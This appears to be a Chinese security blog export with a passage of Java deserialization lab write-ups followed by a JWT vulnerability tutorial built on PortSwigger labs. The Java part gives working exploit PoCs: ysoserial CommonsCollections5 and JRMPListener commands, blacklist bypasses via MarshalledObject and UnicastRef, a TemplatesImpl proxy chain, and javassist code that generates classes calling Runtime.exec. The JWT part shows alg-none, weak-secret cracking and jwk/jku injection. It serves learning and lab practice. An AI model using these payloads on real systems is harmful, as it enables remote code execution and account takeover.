default:    throw new StreamCorruptedException(        String.format(&quot;invalid type code: %02X&quot;, tc));

如果 tc 的值不在预期的类型码范围内，则抛出 StreamCorruptedException，指示流中存在无效的类型码


这段代码通过类型码控制流的执行路径，确保根据序列化协议正确地反序列化不同类型的数据
言归正传，我们继续往下走，由于我们反序列化的userTest是一个普通的java对象，所以会走进TC_OBJECT里

跟进readOrdinaryObject()
当执行完下面这一行之后，我们反序列化过程所需要的各种对象的所有信息就已经存储于其中了

我们跟进readClassDesc方法
tc继续读取下一个字节，TC_CLASSDESC表示接下来要反序列化的是一个Class
跟进readNonProxyDesc()

这里尝试读取类标识符，跟进readClassDescriptor()

跟进readNonProxy方法

该方法主要就是对反序列化类的属性进行一个读取

接着一路返回，回到readNonProxyDesc()，此时readDesc已经存放进我们反序列化的UserTest类的相关信息了

接着我们继续往下走，来到这里的resolveClass()
题目中的MyObjectInputStream里面的resolveClass()就是在这个地方做了个黑名单过滤的，如果使用MyObjectInputStream来进行反序列化的话，此处会走入我们自定义的resolveClass中

走进resolveClass函数，直接进行了forName函数的类加载

返回后cl已经是UserTest的Class了

接着一路返回到readOrdinaryObject()，desc已准备就绪

通过forClass函数类加载赋值给cl

接着实例化desc

得到一个空空如也的UserTest对象

往下走，顾名思义是要读取序列化数据，也就是要给obj这个对象的属性赋值
跟进看看

来到这，这里有个hasReadObjectMethod的判断，顾名思义就是判断当前类中有没有重写readObject()，我们的TestUser是没有的，因此直接跳过走到defaultReadFields(obj, slotDesc);

我们跟进该方法，往下走

在这里对基础类型（int，fload，boolean等）进行了赋值
步过了之后我们查看可知obj的age和weight字段都已经进行了赋值

继续往下走，跟进setObjFieldValues()

从参数中我们就知道是对之前还没有赋值的字段进行一个赋值
步过之后，至此所有非traiseint字段都赋值了
一路步过回到readOrdinaryObject()方法

紧接着下面就挨着hasReadResolveMethod的判断，如果为true的话，那么就会执行对应反序列化的类中的readResolve方法
readResolve方法很眼熟吧，认真看过题目提供的代码的话，就知道在MarshalledObject中，有定义readResolve()方法，所以如果对MarshalledObject进行反序列化，那么是会走到if里面的
看看MarshalledObject中的readResolve()

芜湖，里面又是一个原生反序列化，是对MarshalledObject的参数bytes进行一个反序列化
并且MarshalledObject并没有在黑名单中，所以如果构造恶意的MarshalledObject.byte[]，那么对这个MarshalledObject对象进行反序列化的时候就会直接再走一次不受黑名单限制的原生反序列化，通过二次反序列化再次达到攻击
思路已经有了，现在我们用yso工具给我们生成一个payload:
java -jar ysoserial-all.jar CommonsCollections5 &quot;touch /tmp/666&quot; &gt; sherlock.txt

poc：
package org.example;import com.yxxx.javasec.deserialize.MarshalledObject;import com.yxxx.javasec.deserialize.Utils;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        MarshalledObject marshalledObject = new MarshalledObject();        byte[] fileContent = Files.readAllBytes(Paths.get(&quot;E:\\safety\\ysoserial-master\\sherlock.txt&quot;));        Class&lt;?&gt; marshalledClass = MarshalledObject.class;        Field field = marshalledClass.getDeclaredField(&quot;bytes&quot;);        field.setAccessible(true);        field.set(marshalledObject, fileContent);        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();        ObjectOutputStream outputStream = new ObjectOutputStream(byteArrayOutputStream);        outputStream.writeUTF(&quot;SJTU&quot;);        outputStream.writeInt(1896);        outputStream.writeObject(marshalledObject);        System.out.println(Utils.bytesTohexString(byteArrayOutputStream.toByteArray()));        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();    &#125;&#125;

将生成的hex编码拿去测试，成功写入

Lab6查看该题代码，与lab5的差别在于类MarshalledObject不存在，并且MyObjectInputStream类进行了一定的变化

resolveClass方法的检验黑名单中少了java.rmi.server，也就是说这题我们可以用上rmi&#x2F;jrmp注入了
但是呢在resolveProxyClass方法里面还加了一个黑名单的过滤
查看下该方法的用法

在ObjectInputStream类的readProxyDesc方法中会用到，再查看readProxyDesc的用法

在readClassDesc方法中用到，并且在case为TC_PROXYCLASSDESC的时候，也就是说当处理的是代理对象的时候
继续向上查找，方法有点多就不看了。。。。。。
该题的jdk版本为8u222，所以会有JEP90机制，我们需要进行一个绕过
先利用yso开一个恶意服务端
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 &quot;calc&quot;

初步Poc如下：
package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 1099);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);        Registry proxy = (Registry) Proxy.newProxyInstance(Main.class.getClassLoader(), new Class[] &#123;                Registry.class        &#125;, obj);        ByteArrayOutputStream bytes = new ByteArrayOutputStream();        ObjectOutputStream out = new ObjectOutputStream(bytes);        out.writeUTF(&quot;SJTU&quot;);        out.writeInt(1896);        out.writeObject(proxy);        System.out.println(Utils.bytesTohexString(bytes.toByteArray()));        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray());        ObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();    &#125;&#125;

报错如下：
调试看一手，走进readObject()，调用栈如下

走进了题目自定义的resolveProxyClass方法里面

就是最后一步我们将UnicastRef对象给包装为代理对象后给报的错误
（很奇怪虽然报错了，但是计算器还是弹了出来）
看一下要怎么避免这种情况
网络上一篇文章如下写道：

文中提到了UnicaseRef对象不用封装成Remote类型便可以直接拿来用
芜湖，改一手
package org.example;import com.yxxx.javasec.deserialize.MyObjectInputStream;import com.yxxx.javasec.deserialize.Utils;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.rmi.server.ObjID;import java.util.Random;public class Main &#123;    public static void main(String[] args) throws Exception &#123;        ObjID id = new ObjID(new Random().nextInt()); // RMI registry        TCPEndpoint te = new TCPEndpoint(&quot;127.0.0.1&quot;, 1099);        UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));        ByteArrayOutputStream bytes = new ByteArrayOutputStream();        ObjectOutputStream out = new ObjectOutputStream(bytes);        out.writeUTF(&quot;SJTU&quot;);        out.writeInt(1896);        out.writeObject(ref);        System.out.println(Utils.bytesTohexString(bytes.toByteArray()));        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray());        ObjectInputStream objectInputStream = new MyObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();    &#125;&#125;

本地测试成功弹出计算器，拿着打印出来的hex字符串去测试一下，也成功弹出
剩下就是只要把恶意服务端那边的命令换一下就可以了
Lab7参考文章：https://blog.hackpax.top/JavaDeserializeLabs/#0x07-Lab7
Lab9题目给了个MyInvocationHandler，主要内容就是反射调用type参数的所有方法

一下子就想到了可以利用TemplatesImpl里面的newTransformer()方法，来实现任意类加载
然后又是在invocationhandler里面的，那肯定就是要利用动态代理来解决题目
动态代理的工作原理大家肯定都清楚，在这里的话需要调用任意的有参方法，不然的话xmethod.invoke(args[0]);会报错
在cc链中有利用到动态代理和newTransformer()方法的是cc2这条链
可惜题目依赖里面没有cc了
但是无妨，PriorityQueue类还是可以用的，并且PriorityQueue的shiftDownUsingComparator()方法中存在一个compare()方法的调用

comparator如果为代理对象，根据前面的动态代理的知识，对应的invocationHandler中的invoke()方法就会被调用，因此这里的comparator需要是一个invocationHandler为MyInvocationHandler对象的动态代理
当调用到compare()方法后，就会触发invoke()，compare()的参数，即queue数组中的元素会传入invoke()的args
因此poc如下：
package org.example;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import com.yxxx.javasec.deserialize.MyInvocationHandler;import com.yxxx.javasec.deserialize.Utils;import javax.xml.transform.Templates;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Proxy;import java.nio.file.Files;import java.nio.file.Paths;import java.util.Comparator;import java.util.PriorityQueue;public class Main &#123;    public static void main(String[] args) throws Exception&#123;        TemplatesImpl templates = new TemplatesImpl();        Class tc = templates.getClass();        Field nameField = tc.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;aaa&quot;);        Field bytecodesField = tc.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\mycode\\tmp\\Test.class&quot;));        byte[][] codes = &#123;code&#125;;        bytecodesField.set(templates, codes);        Field tfactoryField = tc.getDeclaredField(&quot;_tfactory&quot;);        tfactoryField.setAccessible(true);        tfactoryField.set(templates, new TransformerFactoryImpl());//        templates.newTransformer();        InvocationHandler myinvocationhandler = new MyInvocationHandler();        Field typeFiled = MyInvocationHandler.class.getDeclaredField(&quot;type&quot;);        typeFiled.setAccessible(true);        typeFiled.set(myinvocationhandler, Templates.class);        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]&#123;Comparator.class&#125;, myinvocationhandler);        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(comparator);        Class pc = PriorityQueue.class;        Field sizeField = pc.getDeclaredField(&quot;size&quot;);        sizeField.setAccessible(true);        sizeField.set(priorityQueue, 2);        Field queueField = pc.getDeclaredField(&quot;queue&quot;);        queueField.setAccessible(true);        queueField.set(priorityQueue, new Object[]&#123;templates,templates&#125;);        ByteArrayOutputStream bytes = new ByteArrayOutputStream();        ObjectOutputStream out = new ObjectOutputStream(bytes);        out.writeUTF(&quot;SJTU&quot;);        out.writeInt(1896);        out.writeObject(priorityQueue);        System.out.println(Utils.bytesTohexString(bytes.toByteArray()));        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes.toByteArray());        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);        objectInputStream.readUTF();        objectInputStream.readInt();        objectInputStream.readObject();    &#125;&#125;

成功弹出计算器
如果说给invocationHandler赋值的时候，type如果是TemplatesImpl.class，那么会报错，methods数组值也有很多
所以这里我们应该是给type赋值Templates.class才对，这样子methods数组里面就只有两个方法了
javassist的妙用javassist可以动态生成java字节码，可以在程序运行时生成新的类
导入依赖
&lt;dependency&gt;    &lt;groupId&gt;org.javassist&lt;/groupId&gt;    &lt;artifactId&gt;javassist&lt;/artifactId&gt;    &lt;version&gt;3.30.2-GA&lt;/version&gt;&lt;/dependency&gt;

更具体的描述可以在：https://cina666.github.io/2025/03/21/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRome/找到，这里就简单总结一下
创建恶意类public static byte[] getEvilBytes(String cmd) throws Exception &#123;    ClassPool classPool = ClassPool.getDefault();    CtClass ctClass = classPool.makeClass(&quot;evil&quot;);    // 设置父类为 AbstractTranslet    CtClass abstractTransletClass = classPool.get(AbstractTranslet.class.getName());    ctClass.setSuperclass(abstractTransletClass);    // 编写恶意代码    String code = &quot;&#123;&quot;            + &quot; namesArray = new String[]&#123;\&quot;hello\&quot;&#125;;&quot;  // 初始化 namesArray            + &quot; java.lang.Runtime.getRuntime().exec(new String(java.util.Base64.getDecoder().decode(\&quot;&quot; + cmd + &quot;\&quot;)));&quot;  // 执行命令            + &quot;&#125;&quot;;    // 创建构造器    CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;, ctClass);    constructor.setBody(&quot;&#123; super(); &quot; + code + &quot; &#125;&quot;);  // 调用父类构造器，并初始化字段    ctClass.addConstructor(constructor);    // 写入字节码到文件    ctClass.writeFile();    // 返回字节码    return ctClass.toBytecode();&#125;

更详细的常见类代码：
ClassPool classPool = ClassPool.getDefault();CtClass ctClass = classPool.makeClass(&quot;evil&quot;);String code = &quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;;ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//设置父类CtConstructor constructor = ctClass.makeClassInitializer();//定义类初始化constructor.setBody(&quot;System.out.println(\&quot;静态代码块内\&quot;);&quot;);constructor.insertBefore(code);//写静态代码块CtField ctField = new CtField(CtClass.intType,&quot;number&quot;,ctClass);//设置属性ctField.setModifiers(Modifier.PUBLIC);//设置属性的修饰符ctClass.addField(ctField);CtField ctField1 = new CtField(classPool.get(String.class.getName()),&quot;str&quot;,ctClass);ctField1.setModifiers(Modifier.PRIVATE);ctClass.addField(ctField1);CtField ctField2 = CtField.make(&quot;public int qwq;&quot;,ctClass);//另一种构造属性的方法，更方便ctClass.addField(ctField2);CtConstructor constructor1 = new CtConstructor(new CtClass[]&#123;classPool.get(String.class.getName()),classPool.get(int.class.getName())&#125;,ctClass);constructor1.setBody(&quot;&#123;this.str = $1;\nthis.number = $2;\nSystem.out.println(\&quot;构造函数内\&quot;);&#125;&quot;);ctClass.addConstructor(constructor1);CtMethod ctMethod = CtMethod.make(&quot;public int test()&#123;return this.number;&#125;&quot;,ctClass);ctMethod.setModifiers(Modifier.PRIVATE);ctClass.addMethod(ctMethod);ctClass.writeFile();

会生成一个类文件

修改类        ClassPool classPool = ClassPool.getDefault();//        CtClass ctClass = classPool.makeClass(&quot;evil&quot;);        CtClass ctClass = classPool.get(&quot;org.example.MyInvocationHandlerTest&quot;);        String code = &quot;&#123;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&#125;&quot;;        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//设置父类        CtConstructor constructor = ctClass.makeClassInitializer();//定义类初始化        constructor.insertBefore(code);//写静态代码块        ctClass.writeFile(&quot;MyInvocationHandlerTestOutPut&quot;);

绕过构造函数创建一个对象通过ReflectionFactoryhttps://www.cnblogs.com/strongmore/p/15470175.html
这里写个方法方便之后进行调用
public static Object createObjWithoutConstructor(Class clazz) throws Exception&#123;    ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory();    Constructor&lt;Object&gt; constructor = Object.class.getDeclaredConstructor();    Constructor&lt;?&gt; constructor1 = reflectionFactory.newConstructorForSerialization(clazz,constructor);    constructor1.setAccessible(true);    return constructor1.newInstance();&#125;

通过Unsafe在高版本中sun包里面的类用不了可以通过反射来进行调用
那里面的类都是存在的，但是JDK做了限制不让用而已
这里写的是反射调用Unsafe，当然ReflectionFactory也是可以的
public static &lt;T&gt; T createObjWithoutConstructor(Class&lt;T&gt; c) throws Exception&#123;    Class&lt;?&gt; name = Class.forName(&quot;sun.misc.Unsafe&quot;);    Field unsafeField = name.getDeclaredField(&quot;theUnsafe&quot;);    unsafeField.setAccessible(true);    Method allocateInstanceMethod = name.getDeclaredMethod(&quot;allocateInstance&quot;, Class.class);    allocateInstanceMethod.setAccessible(true);    return (T) allocateInstanceMethod.invoke(unsafeField.get(null),c);&#125;

反射修改static finalhttps://blog.csdn.net/qq_37687594/article/details/121317703
例子如下：
//反射获取所需属性Field WRAP_SAME_OBJECT_FIELD = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;); //使用modifiersField反射修改final型变量java.lang.reflect.Field modifiersField = Field.class.getDeclaredField(&quot;modifiers&quot;);modifiersField.setAccessible(true);modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);WRAP_SAME_OBJECT_FIELD.setAccessible(true);lastServicedRequestField.setAccessible(true);lastServicedResponseField.setAccessible(true); //将变量WRAP_SAME_OBJECT_FIELD设置为trueif (!WRAP_SAME_OBJECT_FIELD.getBoolean(null))&#123;    WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);&#125;

]]></content>
      <categories>
        <category>Write-Up</category>
      </categories>
  </entry>
  <entry>
    <title>JWT漏洞学习</title>
    <url>/2024/10/08/JWT%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[借鉴JWT渗透姿势

JWT（JSON Web Token）是一种无状态认证机制，通过将用户身份和权限信息存储在令牌中，实现安全地在网络应用间传递信息。它具有跨域支持、扩展性和灵活性、安全性以及可扩展的验证方式等特点，成为现代应用开发中重要的认证和授权解决方案。
JWT的组成JWT的结构由三部分组成，分别是Header、Payload和Signature，下面是每一部分的详细介绍和示例：
Header 部分在 JWT 中 Header 部分存储的是 Token 类型和加密算法，通常使用JSON对象表示并使用Base64编码，其中包含两个字段：alg和typ

alg(algorithm)：指定了使用的加密算法，常见的有HMAC、RSA和ECDSA等算法
typ(type)：指定了JWT的类型，通常为JWT

下面是一个示例Header：
&#123;  &quot;alg&quot;: &quot;HS256&quot;,   &quot;typ&quot;: &quot;JWT&quot;&#125;

Payload 部分Payload包含了JWT的主要信息，通常使用JSON对象表示并使用Base64编码，Payload中包含三个类型的字段：注册声明、公共声明和私有声明

公共声明：是自定义的字段，用于传递非敏感信息，例如:用户ID、角色等
私有声明：是自定义的字段，用于传递敏感信息，例如密码、信用卡号等
注册声明：预定义的标准字段，包含了一些JWT的元数据信息，例如:发行者、过期时间等

下面是一个示例Payload：
&#123;  &quot;sub&quot;: &quot;1234567890&quot;,  &quot;name&quot;: &quot;John Doe&quot;,  &quot;iat&quot;: 1516239022&#125;

其中sub表示主题，name表示名称，iat表示JWT的签发时间
Signature 部分Signature是使用指定算法对Header和Payload进行签名生成的，用于验证JWT的完整性和真实性

Signature的生成方式通常是将Header和Payload连接起来然后使用指定算法对其进行签名，最终将签名结果与Header和Payload一起组成JWT
Signature的生成和验证需要使用相同的密钥

下面是一个示例Signature
HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),secret)

其中HMACSHA256是使用HMAC SHA256算法进行签名，header和payload是经过Base64编码的Header和Payload，secret是用于签名和验证的密钥，最终将Header、Payload和Signature连接起来用句点(.)分隔就形成了一个完整的JWT
完整的JWT第一部分是Header，第二部分是Payload，第三部分是Signature，它们之间由三个 . 分隔，注意JWT 中的每一部分都是经过Base64编码的，但并不是加密的，因此JWT中的信息是可以被解密的
下面是一个示例JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

JWT名词
JWS（Signed JWT）：JWS是指已签名的JWT。它由JWT的Header、Payload和Signature组成，其中Signature是使用密钥对Header和Payload进行数字签名得到的。通过验证签名，可以确保JWT的完整性和真实性。
JWK（JSON Web Key）：JWK是指用于JWT的密钥。它可以是对称加密密钥（例如密码），也可以是非对称加密密钥（例如公钥&#x2F;私钥对）。JWK用于生成和验证JWT的签名，确保只有拥有正确密钥的一方能够对JWT进行操作。
JWE（Encrypted JWT）：JWE是指经过加密的JWT。它是在JWS基础上进行了进一步的加密，将JWT的Payload部分加密后得到的结果。JWE可用于保护敏感信息，确保只有授权的接收方能够解密和读取JWT的内容。
JKU（JSON Web Key Set URL）：JKU是JWT Header中的一个字段，该字段包含一个URI，用于指定用于验证令牌密钥的服务器。当需要获取公钥或密钥集合时，可以使用JKU字段指定的URI来获取相关的JWK信息。
X5U：X5U是JWT Header中的一个字段，它是一个URL，指向一组X.509公钥证书。类似于JKU，X5U字段用于指定可用于验证JWT的公钥证书的位置。
X.509标准：X.509是一种密码学标准，定义了公共密钥基础设施（PKI）中的数字证书格式。这些证书包含有关实体（例如个人、组织或设备）的信息，以及相关的公钥和数字签名。X.509证书在许多互联网协议中广泛使用，如TLS&#x2F;SSL等。

解密平台下面是一个JWT在线构造和解构的平台：
https://jwt.io/
工作原理JWT的工作流程如下：

用户在客户端登录并将登录信息发送给服务器
服务器使用私钥对用户信息进行加密生成JWT并将其发送给客户端
客户端将JWT存储在本地，每次向服务器发送请求时携带JWT进行认证
服务器使用公钥对JWT进行解密和验证，根据JWT中的信息进行身份验证和授权
服务器处理请求并返回响应，客户端根据响应进行相应的操作

JWT 基础安全问题（bp靶场）1、未对签名进行验证JWT库会通常提供一种验证令牌的方法和一种解码令牌的方法，比如:Node.js库jsonwebtoken有verify()和decode()，有时开发人员会混淆这两种方法，只将传入的令牌传递给decode()方法，这意味着应用程序根本不验证签名
下边我们通过portswigger靶场来演示一下这个漏洞案例：
要求：此实验室使用基于 JWT 的机制来处理会话。由于实现缺陷，服务器不会验证它收到的任何 JWT 的签名。要解决该实验，请修改您的会话令牌以访问 /admin 上的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter

首先我们先登录题目提供的账号wiener，然后去bp的HTTP历史记录里面查看相关条目

可以发现在我们登陆的时候响应包设置了一个seesion值，观察其结构可以发现是JWT形式的，其payload部分选中即可查看

在该条目下可以发现我们登录成功的凭证是session值，根据题目提示可以知道该题只有解码，没有验证，所以我们可以直接修改payload部分实现身份变更
访问&#x2F;admin，回显提示需要administrator身份才可以访问
将条目&#x2F;my-account?id&#x3D;wiener发送至repeater，在请求面板中，转到 JSON Web Token 选项卡（注意该选项卡需要提前安装插件JWT Editor）

将其中的sub值改为administrator，复制JWT值，在session处进行替换，便可以成功访问&#x2F;admin，删除用户carlos，题目解决
2、未对加密算法进行强验证在JWT的Header中alg的值用于告诉服务器使用哪种算法对令牌进行签名，从而告诉服务器在验证签名时需要使用哪种算法，JWT同时也支持将算法设定为”None”，如果”alg”字段设为”None”，则标识不签名（后面签名部分可以直接删去），这样一来任何token都是有效的，设定该功能的最初目的是为了方便调试，但是若不在生产环境中关闭该功能，攻击者可以通过将alg字段设置为”None”来伪造他们想要的任何token，接着便可以使用伪造的token冒充任意用户登陆网站
下面为portswigger靶场中的一个漏洞案例：
此实验室使用基于 JWT 的机制来处理会话。服务器被不安全地配置为接受未签名的 JWT。要解决该实验，请修改您的会话令牌以访问 /admin 上的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter

开启题目环境，登录账号后按照上一题进行操作，结果会失败，回显表明该题有开启验证方法
将header部分alg的值改为none后，同时将签名部分删去，要保留payload部分的点
更改session值并访问&#x2F;admin，成功如下

然后便可以删去用户carlos，解决题目
3、弱密钥如果使用了不安全的算法（如弱 HMAC 哈希算法），或者算法参数（如密钥长度）不足够强，攻击者可以通过暴力破解、碰撞攻击或其他密码学攻击来伪造有效的 JWT
下面为portswigger靶场中的一个漏洞案例：
要解决实验室问题，请先暴力破解网站的密钥。获得此令牌后，使用它对修改后的会话令牌进行签名，该令牌允许您访问 /admin 的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter

前面两种方法都不起作用，所以开始尝试爆破密钥

JWT字典：https://github.com/wallarm/jwt-secrets
我们使用jwt_tool来爆破JWT：https://github.com/ticarpi/jwt_tool
使用教程：https://www.cnblogs.com/xiaozi/p/12005929.html

首先登录拿到账号的jwt，然后将该jwt拿去爆破，结果如下：
可以看到结果中表明secret1就是该jwt的密钥
拿到解密平台中去伪造一个我们所需的jwt

要记得sub值要为管理员的身份
然后拿着伪造的jwt去访问&#x2F;admin，成功访问，删除要求用户便可以，题目解决
JWT标头注入1、通过jwk参数注入自签名的JWT通过 JWK（JSON Web Key）参数注入自签名 JWT 的漏洞是一种利用不安全的 JWT 处理方式来伪造有效身份的攻击手法。这个漏洞主要是由于不安全地处理和解析 JWT 的 公钥，特别是当服务器允许用户通过 JWT 提供自定义的 JWK 时，攻击者可以利用该漏洞来伪造合法的签名，从而冒充其他用户或提升权限。
漏洞工作原理JWT 通常用于在客户端和服务器之间安全地传输身份信息。JWT 的安全性依赖于正确的签名和验证过程。以下是漏洞的关键点：

JWT 签名与验证机制：
JWT 可以使用对称算法（如 HS256）或非对称算法（如 RS256）来进行签名。
在非对称算法中（如 RS256），签名是通过 私钥 生成的，而验证则使用 公钥。


**JWK (JSON Web Key)**：
JWK 是一种用于表示密钥的标准化格式。JWT 头部中可以包含一个 jwk 字段，表示公钥的相关信息。
当服务器在验证 JWT 时，如果发现 JWT 中包含 jwk 参数，它会尝试从中解析出公钥，并用该公钥来验证 JWT 的签名。


JWK 参数注入的攻击思路：
服务器如果允许用户通过 JWT 的头部传递 自定义的 JWK，并没有严格验证这个公钥的来源或合法性，那么攻击者可以利用这一点，注入自己的公钥来生成和验证伪造的签名。
攻击者首先生成一对 私钥&#x2F;公钥，使用自己的私钥对 JWT 进行签名，然后在 JWT 的头部包含攻击者的公钥信息。由于服务器错误地信任了 JWT 中的 JWK 参数，它会用攻击者提供的公钥验证攻击者的伪造签名，从而认为 JWT 是合法的。



攻击过程
生成攻击者的密钥对： 攻击者首先生成一对非对称密钥对（私钥和公钥），用于伪造 JWT。

伪造 JWT：

攻击者用自己的 私钥 签名一个自定义的 JWT（可以修改载荷中的敏感数据，例如提升权限）。
在 JWT 头部的 jwk 参数中，攻击者包含自己的 公钥，用于让服务器在验证时错误地接受这个伪造的公钥。

JWT 头部示例：
&#123;  &quot;alg&quot;: &quot;RS256&quot;,  &quot;jwk&quot;: &#123;    &quot;kty&quot;: &quot;RSA&quot;,    &quot;n&quot;: &quot;&lt;attacker&#x27;s public key modulus&gt;&quot;,    &quot;e&quot;: &quot;AQAB&quot;  &#125;&#125;

发送伪造的 JWT： 攻击者将伪造的 JWT 发送给服务器，服务器错误地使用 JWT 中的攻击者公钥来验证签名。

绕过签名验证： 由于服务器使用攻击者的公钥，验证通过，攻击者成功伪造了一个合法的 JWT，从而绕过身份验证或权限控制。


题目了解了原理之后，靶场中的题目便可以轻松解决了
要求：此实验室使用基于 JWT 的机制来处理会话。服务器支持 JWT 标头中的 jwk 参数。这有时用于将正确的验证密钥直接嵌入到令牌中。但是，它无法检查提供的密钥是否来自受信任的来源。要解决实验问题，请修改并签署一个 JWT，该 JWT 允许您访问 /admin 的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter
首先登录账号，利用bp获取到jwt
利用bp中的插件JWT Editor生成一个新的RSA密钥

将我们所需的条目（只要有JWT值得都可以）放入重放器中，选项选择JSON Web Token

kid值要改为刚生成的密钥id，sub值要改为管理员
首先点击攻击，选择第一个后将我们刚刚生成的RSA密钥导入进去，最后将新生成的JWT复制即可
回到谷歌，利用插件Cookie Editor将我们的session值进行更改，保存

访问&#x2F;admin，删去用户carlos，题目解决
2、通过jku参数注入自签名的JWT漏洞成因
信任外部 jku 源：在一些情况下，服务器允许客户端通过 jku 参数提供一个 URL，服务器会从这个 URL 获取公钥来验证 JWT 的签名。如果服务器没有对 jku 参数中的 URL 进行严格限制或校验，攻击者可以将该 URL 指向他们控制的服务器，从而提供一个伪造的公钥。
自签名 JWT：攻击者可以生成一个合法格式的 JWT，并使用自己的私钥进行签名。随后，他们将 jku 指向自己控制的服务器，该服务器会返回与其私钥对应的公钥。由于服务器信任 jku 提供的公钥，因此会错误地验证攻击者签名的 JWT。
绕过签名验证：通过操控 jku 参数，攻击者可以伪造一个有效的 JWT，服务器由于使用了错误的公钥验证签名，认为该 JWT 是合法的。这可能导致攻击者获得提升的权限或未授权的访问。


题目要求：此实验室使用基于 JWT 的机制来处理会话。服务器支持 JWT 标头中的 jku 参数。但是，在获取密钥之前，它无法检查提供的 URL 是否属于受信任的域。要解决实验问题，请伪造一个 JWT，让您能够访问 /admin 的管理面板，然后删除用户 carlos。您可以使用以下凭证登录自己的帐户：wiener：peter
首先登陆账号，获取到我们所需的jwt
因为接受jku参数，所以我们就需要伪造一个
首先复制公钥，将其拿到题目提供的服务器中去

要记住再粘贴之前需要加上key头
&#123;    &quot;keys&quot;: [    ]&#125;

如下：

复制漏洞服务器的地址
回到bp中，我们需要修改kid和sub值，添加jku键值对

更改结束后，点击Sign，要选对模式

然后i将新生成的jwt复制后拿去替换掉原来的jwt值，进入&#x2F;admin，删去用户carlos，题目解决
